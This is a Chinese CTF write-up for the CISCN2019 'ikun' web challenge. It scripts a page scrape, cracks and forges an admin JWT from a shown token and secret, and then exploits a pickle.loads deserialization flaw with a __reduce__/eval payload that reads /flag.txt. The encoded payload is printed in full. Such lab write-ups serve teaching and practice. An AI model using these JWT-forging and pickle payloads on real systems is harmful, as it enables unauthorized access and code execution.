# 题目

## [CISCN2019 华北赛区 Day1 Web2]ikun1

提示 python pickle



1.查看页面源码，发现提示

![image-hint](../images/ikun-hint.png)
页面提示“爆破*站：资金募集 11540.0
ikun们冲鸭,一定要买到lv6!!!”

先通过代码找到lv6
```python
import requests
for i in range(200):
    url='http://a6d3ddb8-6b69-4a87-ba44-ed25aa0a0cee.node5.buuoj.cn:81/shop?page='+str(i)
    result=requests.get(url).text
    if '/static/img/lv/lv6.png' in result:
        print (url)
```
http://a6d3ddb8-6b69-4a87-ba44-ed25aa0a0cee.node5.buuoj.cn:81/shop?page=181
找到level 6的页面 181，

下单，修改优惠比例，提示admin才行，查看页面请求，得到jwt token

2.解密jwt token

JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluMSJ9.kFKLac89rUM6C1Rk2FHRmwWFsd0DFfwxuqM1rdaeRNU;

得到密码是1kun

![ikun-jwtcrack](../images/ikun-jwtcrack.png)

重新构建jwt 填回页面，找到

```javascript
<div class="ui text container login-wrap-inf">
<!-- 潜伏敌后已久,只能帮到这了 -->
<a href="/static/asd1f654e683wq/www.zip" ><span style="visibility:hidden">删库跑路前我留了好东西在这里</span></a>
<div class="ui segments center padddd">
<!-- 对抗*站黑科技，目前为测试阶段，只对管理员开放 -->
<div class="ui segment">
<img src="/static/img/b.png" alt=""/>
```

3.下载源码

发现有pickle，怀疑有pickle反序列化漏洞(admin.py)

```python
import tornado.web
from sshop.base import BaseHandler
import pickle
import urllib


class AdminHandler(BaseHandler):
    @tornado.web.authenticated
    def get(self, *args, **kwargs):
        if self.current_user == "admin":
            return self.render('form.html', res='This is Black Technology!', member=0)
        else:
            return self.render('no_ass.html')

    @tornado.web.authenticated
    def post(self, *args, **kwargs):
        try:
            become = self.get_argument('become')
            p = pickle.loads(urllib.unquote(become))
            return self.render('form.html', res=p, member=1)
        except:
            return self.render('form.html', res='This is Black Technology!', member=0)
```

构建运行脚本（需用python2）

```python
import pickle
import urllib

class payload(object):
    def __reduce__(self):
       return (eval, ("open('/flag.txt','r').read()",))

a = pickle.dumps(payload())
a = urllib.quote(a)
print(a)
```



```shell
 ✘ 🐸   ~/Alven/CTF/BugKu/web-ikun1  /Users/alven/.pyenv/versions/2.7.18/bin/python /Users/alven/Alven/CTF/BugKu/web-ikun1/www/exp.py
c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.
```



替换become参数为上payload，得出

![ikun-decome-bp](../images/ikun-decome-bp.png)


# 得出
flag{69f0688e-9ae0-4f82-a181-ad455a7a8fd1}

# 参考
https://guokeya.github.io/post/ciscn2019-hua-bei-sai-qu-day1-web2ikunpython-fan-xu-lie-hua/